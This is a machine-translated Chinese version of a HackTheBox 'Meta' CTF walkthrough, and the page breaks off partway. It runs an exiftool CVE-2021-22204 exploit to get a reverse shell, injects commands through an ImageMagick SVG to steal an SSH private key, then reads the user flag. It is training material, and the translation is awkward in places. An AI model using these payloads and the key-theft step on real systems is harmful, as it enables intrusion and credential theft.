<html>
<head>
<title>Meta from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">来自HackTheBox的元数据—详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/meta-from-hackthebox-detailed-walkthrough-a26925443ab7?source=collection_archive---------0-----------------------#2022-06-14">https://infosecwriteups.com/meta-from-hackthebox-detailed-walkthrough-a26925443ab7?source=collection_archive---------0-----------------------#2022-06-14</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="d0c6" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">向您展示完成盒子所需的所有工具和技术。</h2></div><h1 id="0473" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">机器信息</h1><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/de5d2e1e1be15052bc4609d6b4d17a20.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*zqkMEEfHBTmFgFWk.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">黑客盒子里的Meta</figcaption></figure><p id="5ec1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">Meta是HackTheBox上的中型机器。初步扫描发现一个简单的网站，但这是一个死胡同。在一些枚举之后，我们有了一个子域，从那里我们找到了一种利用exiftool的易受攻击版本的方法。这导致了一个反向shell，我们在其中发现了一个易受攻击的Mogrify版本，该版本允许我们泄漏私有ssh密钥。作为用户登录，more enumeration发现neofetch，我们通过一个错误配置的环境变量强制使用我们控制下的配置文件。</p><p id="8be9" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">所需的技能是基本的网络和操作系统枚举。学到的技能是利用公共资源，并充分利用它们。</p><div class="mf mg gp gr mh mi"><a href="https://www.hackthebox.com/home/machines/profile/429" rel="noopener  ugc nofollow" target="_blank"><div class="mj ab fo"><div class="mk ab ml cl cj mm"><h2 class="bd ir gy z fp mn fr fs mo fu fw ip bi translated">Meta —破解机箱::渗透测试实验室</h2><div class="mp l"><h3 class="bd b gy z fp mn fr fs mo fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mq l"><p class="bd b dl z fp mn fr fs mo fu fw dk translated">www.hackthebox.com</p></div></div><div class="mr l"><div class="ms l mt mu mv mr mw ld mi"/></div></div></a></div><h1 id="803f" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">初步侦察</h1><p id="c761" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nc"><img src="../Images/679424cda4abb722a16c5ded26d6715a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4jN2i_YwPGWFd9aGW6m_Vw.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">元的Nmap扫描</figcaption></figure><p id="04eb" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">让我们将IP添加到我们的hosts文件中:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="afa2" class="nm kg iq ni b gy nn no l np nq">┌──(root💀kali)-[~/htb/meta]<br/>└─# echo "10.10.11.140 artcorp.htb" &gt; /etc/hosts</span></pre><p id="659f" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">现在，先看看80端口的网站:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nr"><img src="../Images/1ec71394c47871b639056fdd7c5afd6b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*NFwMDoItImZX1URi.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">艺术公司网站上的Meta box</figcaption></figure><h1 id="ccea" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Gobuster</h1><p id="0c12" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">没什么可看的，就是一个简单的关于某开发公司的页面。捉鬼敢死队的时间到了:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ns"><img src="../Images/09bd1ad60b933f531adbcf20bedb2b2b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NrvPAetjzhSxGvo_g-zMsA.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">vhosts的Gobuster扫描</figcaption></figure><p id="4767" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这将找到一个虚拟主机，让我们将它添加到我们的hosts文件中来看看:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="16cf" class="nm kg iq ni b gy nn no l np nq">┌──(root💀kali)-[~/htb/meta]<br/>└─# echo "10.10.11.140 dev01.artcorp.htb" &gt; /etc/hosts</span></pre><h1 id="99dc" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Dev01子域</h1><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi nt"><img src="../Images/4002abd1272dcb8d0345caeccf625b01.png" data-original-src="https://miro.medium.com/v2/resize:fit:854/format:webp/0*nDAl2WFiCWl3gomR.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">artcorp上的开发子域</figcaption></figure><p id="85c0" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">点击MetaView的链接，我们将进入:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nu"><img src="../Images/d4172f19bc36bce347fc850ceb312091.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*gO671eEf87DSd8DD.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">MetaView上传框</figcaption></figure><p id="4ac9" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这里没有其他东西，所以让我们试着上传一张图片:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nv"><img src="../Images/6c684b5abb48cf6f0dde782147141c0f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*-D4LdkakhOq_xN0m.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">上传文件的元视图详细信息</figcaption></figure><h1 id="3efe" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Exiftool</h1><p id="ff06" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">我们有一些关于上传图片的信息。这看起来像Exiftool输出，让我们在本地测试它:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="088e" class="nm kg iq ni b gy nn no l np nq">┌──(root💀kali)-[~/htb/meta]<br/>└─# exiftool pencer.png                 <br/>ExifTool Version Number         : 12.39<br/>File Name                       : pencer.png<br/>Directory                       : .<br/>File Size                       : 12 KiB<br/>File Modification Date/Time     : 2022:01:20 22:22:23+00:00<br/>File Access Date/Time           : 2022:01:23 11:38:25+00:00<br/>File Inode Change Date/Time     : 2022:01:23 11:38:25+00:00<br/>File Permissions                : -rw-r--r--<br/>File Type                       : PNG<br/>File Type Extension             : png<br/>MIME Type                       : image/png<br/>Image Width                     : 200<br/>Image Height                    : 200<br/>Bit Depth                       : 8<br/>Color Type                      : RGB with Alpha<br/>Compression                     : Deflate/Inflate<br/>Filter                          : Adaptive<br/>Interlace                       : Noninterlaced<br/>SRGB Rendering                  : Perceptual<br/>Gamma                           : 2.2<br/>Pixels Per Unit X               : 4724<br/>Pixels Per Unit Y               : 4724<br/>Pixel Units                     : meters<br/>Image Size                      : 200x200<br/>Megapixels                      : 0.040</span></pre><h1 id="e133" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">CVE-2021年至22204年</h1><p id="1488" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">这是相同的信息，所以假设我们的下一步是找到一种方法来使用它，我搜索了“exiftool exploit ”,并找到了这个。在Github上一看发现了<a class="ae nw" href="https://github.com/convisolabs/CVE-2021-22204-exiftool" rel="noopener ugc nofollow" target="_blank">这个</a> python漏洞。让我们抓住它:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="2b23" class="nm kg iq ni b gy nn no l np nq">┌──(root💀kali)-[~/htb/meta]<br/>└─# git clone https://github.com/convisolabs/CVE-2021-22204-exiftool.git<br/>Cloning into 'CVE-2021-22204-exiftool'...<br/>remote: Enumerating objects: 27, done.<br/>remote: Counting objects: 100% (27/27), done.<br/>remote: Compressing objects: 100% (25/25), done.<br/>remote: Total 27 (delta 6), reused 17 (delta 2), pack-reused 0<br/>Receiving objects: 100% (27/27), 52.53 KiB | 1.12 MiB/s, done.<br/>Resolving deltas: 100% (6/6), done.</span></pre><p id="4167" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">如果需要，安装先决条件:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="d0ac" class="nm kg iq ni b gy nn no l np nq">┌──(root💀kali)-[~/htb/meta/CVE-2021-22204-exiftool]<br/>└─# apt install djvulibre-bin exiftool<br/>Reading package lists... Done<br/>Building dependency tree... Done<br/>Reading state information... Done<br/>Note, selecting 'libimage-exiftool-perl' instead of 'exiftool'<br/>djvulibre-bin is already the newest version (3.5.28-2).<br/>libimage-exiftool-perl is already the newest version (12.39+dfsg-1).<br/>0 upgraded, 0 newly installed, 0 to remove and 135 not upgraded.</span></pre><p id="efe1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">查看exploit.py，我们需要更改IP和端口:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="cb4c" class="nm kg iq ni b gy nn no l np nq">┌──(root💀kali)-[~/htb/meta/CVE-2021-22204-exiftool]<br/>└─# more exploit.py<br/>#!/bin/env python3<br/>import base64<br/>import subprocess<br/>ip = '127.0.0.1'<br/>port = '9090'</span></pre><p id="f0ee" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">使用sed提高速度:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="ccf9" class="nm kg iq ni b gy nn no l np nq">┌──(root💀kali)-[~/htb/meta/CVE-2021-22204-exiftool]<br/>└─# sed -i 's/127.0.0.1/10.10.14.4/g' exploit.py<br/><br/>┌──(root💀kali)-[~/htb/meta/CVE-2021-22204-exiftool]<br/>└─# sed -i 's/9090/1337/g' exploit.py</span></pre><p id="b4a7" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">运行漏洞创建我们的恶意图像文件:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="8e89" class="nm kg iq ni b gy nn no l np nq">┌──(root💀kali)-[~/htb/meta/CVE-2021-22204-exiftool]<br/>└─# python3 exploit.py<br/>    1 image files updated</span></pre><p id="746d" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">现在启动一个nc监听端口1337，然后返回到网站并上传我们的图像:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nx"><img src="../Images/9b6d6ba95b22cedb44b913e37d0df468.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*mslgS6g2LijtDr2q.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">上传恶意图像文件</figcaption></figure><h1 id="e5cc" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">反向外壳</h1><p id="8718" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">切换到我们的监听器，看看我们连接:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="47a7" class="nm kg iq ni b gy nn no l np nq">┌──(root💀kali)-[~/htb/meta]<br/>└─# nc -nlvp 1337  <br/>listening on [any] 1337 ...<br/>connect to [10.10.14.4] from (UNKNOWN) [10.10.11.140] 40330<br/>$</span></pre><p id="58d1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">在我们环顾四周之前升级shell:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="d089" class="nm kg iq ni b gy nn no l np nq">$ python3 -c 'import pty;pty.spawn("/bin/bash")'<br/>www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ^Z<br/>zsh: suspended  nc -nlvp 1337<br/>┌──(root💀kali)-[~/CVE-2021-22204-exiftool]<br/>└─# stty raw -echo; fg<br/>[1]  + continued  nc -nlvp 1337<br/>www-data@meta:/var/www/dev01.artcorp.htb/metaview$ export TERM=xterm<br/>www-data@meta:/var/www/dev01.artcorp.htb/metaview$ stty rows 51 cols 237</span></pre><p id="cdf3" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我们只是一个低级服务客户:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="df79" class="nm kg iq ni b gy nn no l np nq">www-data@meta:/var/www/dev01.artcorp.htb/metaview$ id<br/>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></pre><p id="c74c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">只有一个用户:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="4f09" class="nm kg iq ni b gy nn no l np nq">www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls -lsa /home<br/>4 drwxr-xr-x  6 thomas thomas 4096 Jan 23 04:11 thomas</span></pre><p id="4be1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">用户标志在那里，但我们没有权限读取它:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="ced7" class="nm kg iq ni b gy nn no l np nq">www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls -lsa /home/thomas/<br/>&lt;SNIP&gt;<br/>4 drwx------ 2 thomas thomas 4096 Jan  4 10:22 .ssh<br/>4 -rw-r----- 1 root   thomas   33 Jan 20 15:38 user.txt</span></pre><p id="22f9" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">有趣的是，这里有一个. ssh文件夹，这是可疑的，所以记住它为以后。</p><h1 id="85c8" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">发现的Bash脚本</h1><p id="3d24" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">在把豌豆拉过来之前，我通常会快速地环顾一下四周。在CTF，一个简单的方法来找到文件种植是根据创建日期。这个是许多选项的一个很好的向导。我从1月1日开始搜索新文件:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ny"><img src="../Images/3997967aab8777a5f97ff0ae6aff3594.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5liQN2Kcts-VCA8T2TeSjw.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">按创建日期查找文件</figcaption></figure><p id="1ede" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这是日期范围内的唯一文件。让我们来看看:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="a4aa" class="nm kg iq ni b gy nn no l np nq">www-data@meta:/var/www/dev01.artcorp.htb/metaview$ cat /usr/local/bin/convert_images.sh<br/>#!/bin/bash<br/>cd /var/www/dev01.artcorp.htb/convert_images/ &amp;&amp; /usr/local/bin/mogrify -format png *.* 2&gt;/dev/null<br/>pkill mogrify</span></pre><h1 id="ead3" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">莫格里菲</h1><p id="3de2" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">只是一个简单的脚本使用mogrify从ImageMagick转换任何找到的文件为png。看这里的文件<a class="ae nw" href="https://imagemagick.org/script/mogrify.php" rel="noopener ugc nofollow" target="_blank"/>和<a class="ae nw" href="https://unix.stackexchange.com/questions/391651/find-gif-jpeg-files-with-png-extension-and-convert-to-png" rel="noopener ugc nofollow" target="_blank">这个</a>线程给了我一个线索。</p><p id="76ca" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">让我们看看莫格里菲:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="b367" class="nm kg iq ni b gy nn no l np nq">www-data@meta:/usr/local/bin$ mogrify -version<br/>Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org<br/>Copyright: © 1999-2020 ImageMagick Studio LLC<br/>License: https://imagemagick.org/script/license.php<br/>Features: Cipher DPC HDRI OpenMP(4.5) <br/>Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib</span></pre><h1 id="f5cc" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Imagemagick外壳注射</h1><p id="532f" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">这里的版本是7.0.10。我发现<a class="ae nw" href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html" rel="noopener ugc nofollow" target="_blank">这个</a>告诉我们ImageMagick版本存在漏洞。</p><p id="c7ac" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">一直向下滚动到那篇文章的末尾，有一个概念证明:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nz"><img src="../Images/d6e0f9046ccddefc5634309482e2a014.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uP-ODewL-5xFbghuEqgOzQ.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">Imagemacgick注入漏洞</figcaption></figure><p id="c230" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我在盒子上创建了一个名为poc.svg的文件，并将上面的内容放入其中。我唯一更改的是将要创建的文件的路径:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="d13a" class="nm kg iq ni b gy nn no l np nq">&lt;image authenticate='ff" `echo $(id)&gt; /dev/shm/0wned`;"'&gt;</span></pre><p id="792a" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">检查文件在这里:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="86ea" class="nm kg iq ni b gy nn no l np nq">www-data@meta:/dev/shm$ ls -lsa<br/>4 -rw-r--r--  1 www-data www-data  407 Jan 23 13:35 poc.svg</span></pre><p id="36b4" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">现在我们将它复制到脚本运行mogrify的路径:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="cc9a" class="nm kg iq ni b gy nn no l np nq">www-data@meta:/dev/shm$ cp poc.svg /var/www/dev01.artcorp.htb/convert_images/</span></pre><p id="f9c4" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">等待几分钟，再次查看我们的文件:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="5101" class="nm kg iq ni b gy nn no l np nq">www-data@meta:/dev/shm$ ls -lsa<br/>4 -rw-r--r--  1 thomas   thomas     54 Jan 23 13:38 0wned<br/>4 -rw-r--r--  1 www-data www-data  407 Jan 23 13:35 poc.svg</span></pre><h1 id="c742" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">导出SSH私钥</h1><p id="2868" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">让我们用这个从托马斯那里拿到私人钥匙。我们之前看到的ssh文件夹:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nz"><img src="../Images/6fd2c99475069ece686eb43033c642cc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4WW6dPCewUaQSi4ChAJvNw.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">使用imagemagick漏洞获取ssh文件</figcaption></figure><p id="bfe1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">与之前相同，将此文件复制到图像文件夹:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="1fa3" class="nm kg iq ni b gy nn no l np nq">www-data@meta:/dev/shm$ cp poc.svg /var/www/dev01.artcorp.htb/convert_images/</span></pre><p id="1024" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">等待几分钟，我们的文件已经到达:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="8aed" class="nm kg iq ni b gy nn no l np nq">www-data@meta:/dev/shm$ ls -lsa<br/>4 -rw-r--r--  1 thomas   thomas   2590 Jan 23 13:31 id_rsa<br/>4 -rw-r--r--  1 thomas   thomas     54 Jan 23 13:38 0wned<br/>4 -rw-r--r--  1 www-data www-data  412 Jan 23 13:28 poc.svg</span></pre><p id="833f" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">检查内容:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="4025" class="nm kg iq ni b gy nn no l np nq">www-data@meta:/dev/shm$ cat key<br/>-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA<br/>AAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAt9IoI<br/>5gHtz8omhsaZ9Gy+wXyNZPp5jJZvbOJ946OI4g2kRRDHDm<br/>&lt;SNIP&gt;bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE= <br/>-----END OPENSSH PRIVATE KEY-----</span></pre><p id="fe20" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">把盒子里的钥匙复制给卡莉。它的格式不正确，我们来解决一下:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="918b" class="nm kg iq ni b gy nn no l np nq">┌──(root💀kali)-[~/htb/meta]<br/>└─# echo "-----BEGIN OPENSSH PRIVATE KEY-----" &gt; id_rsa<br/><br/>┌──(root💀kali)-[~/htb/meta]<br/>└─# echo "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAA<br/>AAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAt9IoI5gHtz8omhsaZ9<br/>Gy+wXyNZPp5jJZvbOJ946OI4g2kRRDHDm5x7up3z5s/H/yujgjgroOOHh9<br/>zBBuiZ1Jn1jlveRM7H1VLbtY8k/rN9PFe/MkRsYdH45IvV&lt;SNIP&gt;<br/>bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=" | sed 's/ /\n/g' &gt;&gt; id_rsa<br/><br/>┌──(root💀kali)-[~/htb/meta]<br/>└─# echo "-----END OPENSSH PRIVATE KEY-----" &gt;&gt; id_rsa</span></pre><h1 id="19f2" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">用户标志</h1><p id="be84" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">现在，我们可以以thomas的身份登录机器:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="96e0" class="nm kg iq ni b gy nn no l np nq">┌──(root💀kali)-[~/htb/meta]<br/>└─# ssh -i id_rsa thomas@artcorp.htb<br/>Linux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64<br/>thomas@meta:~$</span></pre><p id="4b86" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">让我们获取用户标志:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="d0fa" class="nm kg iq ni b gy nn no l np nq">thomas@meta:~$ cat user.txt<br/>98a4a29173c3f2bd1c6f4006b2498128</span></pre><p id="22e9" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">像以前一样，我通常会在去LinPEAS之前四处看看。Sudo是最先检查的人之一:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi oa"><img src="../Images/45de673b14b98312cf1e287c9085bf7c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*S3x7OYJ0MmaNjA6p8681TQ.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">托马斯的sudo权限</figcaption></figure><p id="7e10" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">可以肯定这是我们的升级途径。</p><h1 id="84ab" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">新获取</h1><p id="5dc1" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">Neofetch是什么？从Gitub回购<a class="ae nw" href="https://github.com/dylanaraps/neofetch/" rel="noopener ugc nofollow" target="_blank">这里</a>:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="b2a3" class="nm kg iq ni b gy nn no l np nq">Neofetch is a command-line system information tool written in bash 3.2+. Neofetch displays information about your operating system, software and hardware in an aesthetic and visually pleasing way.</span></pre><p id="63e7" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">让我们来试试:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="f714" class="nm kg iq ni b gy nn no l np nq">homas@meta:~$ sudo -u root /usr/bin/neofetch \"\"<br/>       _,met$$$$$gg.          root@meta <br/>    ,g$$$$$$$$$$$$$$$P.       --------- <br/>  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64 <br/> ,$$P'              `$$$.     Host: VMware Virtual Platform None <br/>',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 <br/>`d$$'     ,$P"'   .    $$$    Uptime: 3 hours, 27 mins <br/> $$P      d$'     ,    $$P    Packages: 495 (dpkg) <br/> $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 <br/> $$;      Y$b._   _,d$P'      CPU: AMD EPYC 7302P 16- (2) @ 2.994GHz <br/> Y$$.    `.`"Y$$$$P"'         GPU: VMware SVGA II Adapter <br/> `$$b      "-.__              Memory: 115MiB / 1994MiB <br/>  `Y$$                               <br/>   `Y$$.                                              <br/>     `$$b.<br/>       `Y$$b.<br/>          `"Y$b._<br/>              `"""</span></pre><p id="c5b8" class="pw-post-body-paragraph lj 